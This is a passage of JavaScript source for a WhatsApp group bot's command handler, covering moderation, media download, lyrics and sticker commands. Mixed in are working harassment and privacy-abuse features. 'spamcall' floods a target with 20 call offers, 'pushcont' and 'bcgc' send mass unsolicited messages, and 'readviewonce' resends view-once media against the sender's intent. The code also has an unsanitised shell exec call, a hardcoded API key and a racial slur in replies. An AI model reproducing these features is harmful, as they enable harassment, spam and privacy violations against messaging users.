            m.reply("⚠️ Warning for " + targetUser.replace("@s.whatsapp.net", "") + "!\nYou have 1 warning left before the bot takes action.");
        } else if (warningCount === 1) {
            global.db.users[targetUser].warn = 0;
            m.reply("⚠️ Warning limit reached! You will be kicked out of the group, " + targetUser.replace("@s.whatsapp.net", "") + "!");
            
            // Ensure the bot is an admin before kicking
            if (m.isBotAdmin) {
                await m.reply("Warning limit reached! Kicking " + targetUser.replace("@s.whatsapp.net", "") + "...");
                await nØbødy.groupParticipantsUpdate(m.chat, [targetUser], "remove");
                global.db.users[targetUser].warn = 4;
            }
        }
    }
    break;

case "resetwarn":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }

        // Check if the user is banned
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure the command is executed in a group
        if (!m.isGroup) {
            return m.reply(mess.group);
        }

        // Ensure the user has admin rights
        if (!m.isAdmin) {
            return m.reply(mess.admin);
        }

        // Ensure the bot has admin rights
        if (!m.isBotAdmin) {
            return m.reply(mess.botAdmin);
        }

        // Determine the user to reset warning for: mentioned, quoted, or based on the text
        const targetUser = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;

        // Ensure a target user is specified
        if (!targetUser) {
            return m.reply("Tag or reply to the user you want to reset the warning for!");
        }

        // Check if the target user exists in the database, otherwise initialize
        if (!global.db.users[targetUser]) {
            global.db.users[targetUser] = {};
        }

        // Reset the warning count for the target user
        global.db.users[targetUser].warn = 4;
        m.reply("Warning count for " + targetUser.replace("@s.whatsapp.net", "") + " has been reset to 4!");
    }
    break;
case "joingc":
case "join":
    {
        if (m.isGroup && global.db.groups[m.chat].banned) return;
        if (global.db.users[m.sender].banned) return m.reply(mess.ban);
        if (!DevOnly) return m.reply(mess.owner);
        if (!args[0]) return m.reply("Provide a group link.");
        if (!args[0].includes("chat.whatsapp.com")) return m.reply("Invalid group link.");

        try {
            let inviteCode = args[0].split("https://chat.whatsapp.com/")[1];
            await nØbødy.groupAcceptInvite(inviteCode);
            m.reply("✅ Successfully joined the group.");
        } catch (error) {
            console.error(error);
            m.reply("Failed to join the group.");
        }
    }
    break;
case "linkgc":
case "grouplink":
case "invite":
    {
        if (m.isGroup && global.db.groups[m.chat].banned) return;
        if (global.db.users[m.sender].banned) return m.reply(mess.ban);
        if (!m.isGroup) return m.reply(mess.group);
        if (!m.isBotAdmin) return m.reply(mess.botAdmin);

        try {
            let inviteCode = await nØbødy.groupInviteCode(m.chat);
            let groupLink = `https://chat.whatsapp.com/${inviteCode}`;
            await nØbødy.sendMessage(m.chat, { text: `🔗 *Group Link:* ${groupLink}` }, { quoted: m });
        } catch (error) {
            console.error(error);
            m.reply("Failed to fetch group link.");
        }
    }
    break;
case "video":
    {
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }
        if (!args.join(" ")) {
            return m.reply("Please provide a video name.");
        }

        await nØbødy.sendMessage(m.chat, {
            react: { text: "⏳", key: m.key }
        });

        try {
            let searchQuery = args.join(" ");
            let searchResults = await yts(searchQuery);
            const video = searchResults.all[0];

            let videoData = await ytdl.ytmp4(video.url);
            if (videoData.status) {
                await nØbødy.sendMessage(m.chat, {
                    video: { url: videoData.download.url },
                    mimetype: "video/mp4"
                }, { quoted: m });

                await nØbødy.sendMessage(m.chat, {
                    react: { text: "✅", key: m.key }
                });

            } else {
                return m.reply("Error! No result found.");
            }

        } catch (error) {
            console.error(error);
            m.reply("Failed to fetch video. Please try again.");
        }
    }
    break;
case "play":
    {
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }
        if (!args.join(" ")) {
            return m.reply("Please provide a song name.");
        }

        await nØbødy.sendMessage(m.chat, {
            react: { text: "⏳", key: m.key }
        });

        try {
            let searchQuery = args.join(" ");
            let searchResults = await yts(searchQuery);
            const video = searchResults.all[0];

            let audioData = await ytdl.ytmp3(video.url);
            if (audioData.status) {
                await nØbødy.sendMessage(m.chat, {
                    audio: { url: audioData.download.url },
                    mimetype: "audio/mpeg",
                    contextInfo: {
                        externalAdReply: {
                            thumbnailUrl: video.thumbnail,
                            title: video.title,
                            body: `Author: ${video.author.name} | Duration: ${video.timestamp}`,
                            sourceUrl: video.url,
                            renderLargerThumbnail: true,
                            mediaType: 1
                        }
                    }
                }, { quoted: m });

                await nØbødy.sendMessage(m.chat, {
                    react: { text: "✅", key: m.key }
                });

            } else {
                return m.reply("Error! No result found.");
            }

        } catch (error) {
            console.error(error);
            m.reply("Failed to fetch audio. Please try again.");
        }
    }
    break;
case 'playstore': {
if (!text) return m.reply(`${prefix + command} WhatsApp`)
m.reply('ᑭᖇOᑕᗴՏՏIᑎᘜ')
await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
let response = await res.json()
let teks = '*🔎 ᑭᒪYՏTOᖇᗴ*\n\n'
for (let i of response.result) {
teks += `*◦ Title :* ${i.nama}\n`
teks += `*◦ Developer :* ${i.developer}\n`
teks += `*◦ Rating :* ${i.rate}\n`
teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
teks += `*◦ Link Apps Url :* ${i.link}\n\n`
}
m.reply(teks)
}).catch(err => m.reply('Error 🗿'))
}
break
//End
//ᒪYᖇIᑕՏ ᑕՏᗴ
/*
- *(  Lirik  )*
- Created: RizzCode
- Apikeys: https://api.diioffc.web.id
- Sumber: https://whatsapp.com/channel/0029VadfVP5ElagswfEltW0L
- Mengalami Masalah? Hubungi Admin 6287794585528
*/

case "lyrics":
case "lirycs": {
await loading()
  if(!text) return m.reply(`𝙿𝚄𝚃 𝙽𝙰𝙼𝙴 𝙾𝙵 𝚂𝙾𝙽𝙶\n𝙴𝚇𝙰𝙼𝙿𝙻𝙴: 𝙾𝚉𝙴𝙱𝙰 `);
  let anu = `https://api.diioffc.web.id/api/search/lirik?query=${encodeURIComponent(text)}`;

    const res = await fetch(anu);
    const response = await res.json();
  try {
    await m.reply(`𝙻𝚢𝚛𝚒𝚌𝚜: ${response.result.lyrics}`);
  } catch (err) {
    console.log(err);
    await m.reply('𝙽𝚘𝚝 𝙵𝚘𝚞𝚗𝚍')
  }
}
break    
case "gemini":
case "gm": {
await loading()
  if(!text) return m.reply(`𝚆𝙷𝙰𝚃 𝙸𝚂 𝚈𝙾𝚄𝚁 𝚀𝚄𝙴𝚂𝚃𝙸𝙾𝙽?`);
  let api = `https://api.diioffc.web.id/api/ai/gemini?query=${encodeURIComponent(text)}`;
  const res = await fetch(api);
  const response = await res.json();
    m.reply(`${response.result.message}`);
}
break                      		       
 case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply1(`Reply sticker with caption *${prefix + command}*`)
                m.reply(m)
                let media = await nØbødy.downloadAndSaveMediaMessage(m.quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    nØbødy.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
  //End
// Leave case
case 'left':
                if (!DevOnly) return reply1(m.owner)
                if (!m.isGroup) return reply1(m.group)
                reply1('GoodBye Everyone')
                await nØbødy.groupLeave(m.chat)
                break
//End                
                case 'unblock':
                if (!DevOnly) return reply1(m.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await nØbødy.updateBlockStatus(blockww, 'unblock').then((res) => reply1(json(res))).catch((err) => reply1(json(err)))
                break
 //END
 // block 

  //End              
 //Case Join     
case 'join':
                try {
                    if (!DevOnly) return reply1(m.quoted)
                    if (!text) return reply1('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply1('Link Invalid!')
                    reply1(m.qouted)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await nØbødy.groupAcceptInvite(result).then((res) => reply1(json(res))).catch((err) => reply1(json(err)))
                } catch {
                    reply1('Failed to join the Group')
                }
                break                 
// Emoji mix case
case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return reply1(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return reply1(`Example : ${prefix + command} 😅+🤔`)
                reply1(m.quoted)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await nØbødy.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break          
//RESET LINK GC CASE

case 'resetgclink': case 'revoke': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  nØbødy.groupRevokeInvite(from);
}
break;

//END
//GC PP CASE
case "setppgc": {
if (!m.isGroup) return reply1(m.group)
if (!BotAdm) return reply1(m.BotAdm)
if (!Adm && !DevOnly) return reply1(m.adm)
if (/image/g.test(mime)) {
let media = await nØbødy.downloadAndSaveMediaMessage(m.q)
await nØbødy.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
reply1("*𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚌𝚑𝚊𝚗𝚐𝚎 𝚐𝚛𝚘𝚞𝚙 𝚙𝚛𝚘𝚏𝚒𝚕𝚎 𝚙𝚒𝚌 ✅*")
} else return reply1(example('dengan mengirim foto'))
}
break                     		                         		       
case 'ocr': 
case 'extract': {

  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  if (!mime) return reply1("Send / Reply Image");
  if (!/image\/(jpe?g|png)/.test(mime))
    return reply1(`Type ${mime} Not supported!`);
  let image = await q.download();
  let download = await nØbødy.getFile(image, true);
  let ocr = await ocrSpace(download.filename);
  await nØbødy.sendMessage(
    m.chat,
    { text: ocr.ParsedResults[0].ParsedText.trim() },
    { quoted: m },
  );
}
break
//END
//DELETE CASE
case "del": case "delete": {
if (!m.isGroup) {
if (!DevOnly && !isCreator) return reply1(m.admin)
if (!m.quoted) return reply1("𝙿𝚕𝚎𝚊𝚜𝚎 𝚁𝚎𝚙𝚕𝚢 𝚃𝚘 𝚃𝚑𝚎 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚈𝚘𝚞 𝚆𝚊𝚗𝚝 𝚃𝚘 𝙳𝚎𝚕𝚎𝚝𝚎")
if (m.quoted.sender == DevOnly) {
nØbødy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!DevOnly) return reply1(m.owner)
nØbødy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!DevOnly) return reply1(m.owner)
if (!m.quoted) return reply1(example("𝚁𝚎𝚙𝚕𝚢 𝚃𝚘 𝙰 𝚃𝚎𝚡𝚝 𝙾𝚛 𝙼𝚎𝚜𝚜𝚊𝚐𝚎"))
nØbødy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break                      		                         		                         		       
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return reply1(`Reply to an Image or Video with command ${prefix + command}`);
    await loading()
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply1('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply1('Failed to download media!');
    }
    await loading()
    const uploadImage = require('../System/Data6');
    const uploadFile = require('../System/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply1('Failed to upload media!');
    }

    nØbødy.sendMessage(m.chat, {
        text: `(ℕ𝕠 𝔼𝕩𝕡𝕚𝕣𝕚𝕟𝕘 𝔻𝕒𝕥𝕖 𝕆𝕣 𝕌𝕟𝕜𝕟𝕠𝕨𝕟)\n𝕊𝕦𝕡𝕖𝕣 𝕙𝕒𝕤 𝕘𝕖𝕟𝕖𝕣𝕒𝕥𝕖 𝕪𝕠𝕦𝕣 𝕝𝕚𝕟𝕜\n ${link}`
    }, { quoted: m });
}
break
case 'spamcall': {
if (!DevOnly) return 
if (!q) return reply1("Example Use.\n calloffer 234xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply1(`*Successfully Send Spam Call To ${isTarget}*`)
await sleep(1000)
for (let i = 0; i < 20; i++) {
await sendOfferCall(isTarget)
}
}
break


case 'spamcallvid': {
if (!DevOnly) return 
if (!q) return reply1("Example Use.\n calloffervideo 234xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply1(`*Successfully Send Spam Call Video To ${isTarget}*`)
await sleep(1000)
for (let i = 0; i < 20; i++) {
await sendOfferVideoCall(isTarget)
}
}
break

//END
//SS case
case "sspc":
            case "ss":  {
                if(!text) return m.reply("𝙸𝚗𝚙𝚞𝚝 𝙰 𝚕𝚒𝚗𝚔 𝙾𝚛 𝚄𝚛𝚕");
                let anu = `https://api.diioffc.web.id/api/tools/sspc?url=${encodeURIComponent(text)}`;
                await m.reply('𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐏𝐥𝐞𝐚𝐬 𝐖𝐚𝐢𝐭')
                try {
                    nØbødy.sendMessage(m.chat, { image: { url: anu }, caption: "𝚂𝚞𝚙𝚎𝚛" }, { quoted: m })
                } catch (e) {
                    console.log(e);
                    m.reply('error')
                }
            }
            break
//END
//GET Code CASE
case "get": case "fetch": {
await loading()

if (!DevOnly) return reply1(m.owner)

if (!text) return m.reply(example("https://example.com"))

let data = await fetchJson(text)

m.reply(JSON.stringify(data, null, 2))

}

break
//End
//case check channel id
case "chkidch": case "idch": {

if (!text) return m.reply(example("𝕀𝕟𝕡𝕦𝕥 𝕔𝕙𝕒𝕟𝕟𝕖𝕝 𝕝𝕚𝕟𝕜"))

if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link Is Invalid Try Again")

let result = text.split('https://whatsapp.com/channel/')[1]

let res = await nØbødy.newsletterMetadata("invite", result)

let teks = `

* *𝕀𝔻 :* ${res.id}

* *𝕟𝕒𝕞𝕖 :* ${res.name}

* *𝕋𝕠𝕥𝕒𝕝 𝕄𝕖𝕞𝕓𝕖𝕣𝕤 :* ${res.subscribers}

* *𝕊𝕥𝕒𝕥𝕦𝕤 :* ${res.state}

* *𝕍𝕖𝕣𝕚𝕗𝕚𝕖𝕕 :* ${res.verification == "VERIFIED" ? "IS VERIFiED" : "NO"}

`

return m.reply(teks)

}

break
//End
case "block": { 

 if (!DevOnly) return reply1(`You are not my owner`)

    if (!text)  return reply1(`tag user!`)

 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' 

 await nØbødy.updateBlockStatus(users, 'block'); 

 reply1(`*_User Has Been Blocked_*!`); 

 } 

 break  
 //End
case 'poll': {
	if (!DevOnly) return reply1("OWNER ONLY BRO")
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await reply1(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await nØbødy.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return reply1("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await nØbødy.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await nØbødy.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    m.reply("Profile picture set Successfully!");
  } catch (error) {
    console.error(error);
    m.reply("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
//END
//DELETE PP CASE

case "delpp": {
if (!DevOnly) return 
  nØbødy.removeProfilePicture(nØbødy.user.id);
  reply1("Successfully Delete Profile Picture");
}
break;

//END
//Tag Case 
case 'tagall':
                if (!m.isGroup) return m.reply("NIGGA THIS IS A GROUP COMMAND")
                if (!isAdmins && !isGroupOwner && !DevOnly) return reply1("NIGGA YOU MUST BE ADMIN TO USE THIS COMMAND")
                if (!isBotAdmins) return reply1("THIS COMMAND CAN BE USE WHEN BOT IS AN ADMIN")
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                nØbødy.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
//END 
//Logo Case 
case "logo": {
  if(!text) return m.reply('ιηρυт ѕσмє тєχт')
  let url = `https://vapis.my.id/api/logomaker?q=${encodeURIComponent(text)}`;
  const response = await axios.get(url, { responseType: 'arraybuffer' });
  try {
    nØbødy.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Sukses Mengambil Gambar'
    }, {quoted: m})
  } catch (e) {
    console.log(e);
    await m.reply('Error')
  }
}
break
//End
//FF STALK
case "pf":
            case "ffstalk": {
                if(!text) return m.reply("ιησυт ƒƒ ι∂");
                const url = `https://vapis.my.id/api/ff-stalk?id=${encodeURIComponent(text)}`
                const res = await fetch(url);
                const response = await res.json()
                let teks = `*∂αтα σƒ ƒяєє ƒιяє υѕєя*\n\n*_α¢¢συηт:_*\n\n- ηαмє: ${response.data.account.name}\n- ι∂: ${response.data.account.id}\n- ℓєνєℓ: ${response.data.account.level}\n- Xp: ${response.data.account.xp}\n- яєgιση: ${response.data.account.region}\n- ℓιкє: ${response.data.account.like}\n- вισ: ${response.data.account.bio}\n- Honor ѕ¢σяє: ${response.data.account.honor_score}\n- ℓσgιη: ${response.data.account.last_login}\n\n*_∂αтα gυιℓ∂:_*:\n\n gυιℓ∂ - ηαмє: ${response.data.guild.name}\n- ι∂: ${response.data.guild.id}\n- ℓєνєℓ: ${response.data.guild.level}\n-мємвєяѕ αммσυηт: ${response.data.guild.member}\n- ℓєα∂єя: ${response.data.ketua_guild.name}`;
                try {
                    await nØbødy.sendMessage(m.chat, {text: teks}, {quoted: m})
                } catch (e) {
                    console.log(e)
                    await m.reply("error")
                }
            }
            break
//END
//вroadcas gяσυρ ¢αѕє
case 'bcgc': {
if (!DevOnly) return reply1('You are not my owner')
if (!qtext) return reply1('Please reply to a text')
await loading()
let getGroups = await nØbødy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply1(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
for (let i of anu) {
await sleep(1500)
nØbødy.sendMessage(i, {text: `${qtext}`}, {quoted:m})
    }
reply1(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break
//єη∂
//TOVN CASE

case 'tovn':
case 'mp3': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return reply1(`Reply media with caption ${prefix + command}`);
  if (!quoted) return reply1(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./System/Data4');
  let audio = await toAudio(media, 'mp4');
  
  nØbødy.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

//END
//HIDETAG CASE

case 'hidetag': case 'tag': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  nØbødy.sendMessage(from, { text: q ? q : '', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;

//END

case "open":
case "unmute": {

if (!m.isGroup) return m.reply(`This Feature Works In Groups Only`)
if (!isBotAdmins) return m.reply(`👋 hello ${global.author},The bot is not an administrator (admin)`)
if (!isAdmins) return m.reply(`_Only Admin can access this command_ MF`)
await nØbødy.groupSettingUpdate(m.chat, 'not_announcement')
reply1("Successfully Changed Group Settings so Members Can Send Messages 🚀")
}
break

case "close":
case "mute": {

if (!m.isGroup) return m.reply(`This Feature Works In Groups Only`)
if (!isBotAdmins) return m.reply(`👋 hello ${global.author}, The bot is not an administrator`)
if (!isAdmins) return m.reply(`_Only Admin can access this command_ MF`)
await nØbødy.groupSettingUpdate(m.chat, 'announcement')
reply1("Successfully Changed Group Settings to Only Admins Can Send Messages 🚀")
}
break

//KICK CASE

case 'kick': {
if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!isBotAdmins) return  
  if (!isAdmins) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return reply1("Send number / tag users ");
  await nØbødy.groupParticipantsUpdate(from, [users], 'remove');
}
break;
case 'pushcont':{
if (!DevOnly) return reply1('тнιѕ α σωηєя ¢σммα∂')
if (!m.isGroup) return reply1('тнιѕ ¢σммαη∂ ¢αη σηℓу вє υѕє ιη gяσυρѕ')
if (!qtext) return reply1(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply1(`*Send a message to ${mem.length} people, time is over ${mem.length * 3} second*`)
for (let geek of mem) {
await sleep(5000)
nØbødy.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
reply1(`*Successfully sent message To ${mem.length} person*`)
}
break
//END
//RVO CASE

case "rvo":
case "readvo":
case 'readviewonce':
case "vv":
case 'readviewoncemessage': {
await loading() 
if (!m.quoted) return m.reply(example("яєρℓу тσ α νιєω ση¢є мєѕѕαgє"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("тнιѕ ιѕ ησт α νιєω ση¢є мєѕѕαgє!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return nØbødy.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return nØbødy.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return nØbødy.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
//END
//To View once Case 
case 'tovv':
            case 'toviewonce': {
                if (!quoted) return reply1(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await nØbødy.downloadAndSaveMediaMessage(quoted)
                    nØbødy.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `𝙋𝙊𝙒𝙀𝙍𝙀𝘿 𝘽𝙔 𝙉𝙊𝘽𝙊𝘿𝙔 𝙀𝙈𝙋`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await nØbødy.downloadAndSaveMediaMessage(quoted)
                    nØbødy.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `𝙋𝙊𝙒𝙀𝙍𝙀𝘿 𝘽𝙔 𝙉𝙊𝘽𝙊𝘿𝙔 𝙀𝙈𝙋`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
//End 
case 'rate': {
            	if (!text) return reply1(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await reply1(jawab)
            }
            break
case 'when': {
            	if (!text) return reply1(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await reply1(jawab)
            }
            break
case 'define': 
if (!text) return reply1(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return reply1(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   nØbødy.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return reply1(`*${q}* isn't a valid text`)
    }
    break
case 'gdrive': {
		if (!args[0]) return reply1(`Enter the Google Drive link`)
	await loading()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply1(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	nØbødy.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply1('Error: Check link or try another link') 
  }
}
break
case 'dbinary': {
if (!q) return reply1(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('../trashbase/lib/binary')
let db = await dBinary(`${q}`)
reply1(db)
}
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await loading()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
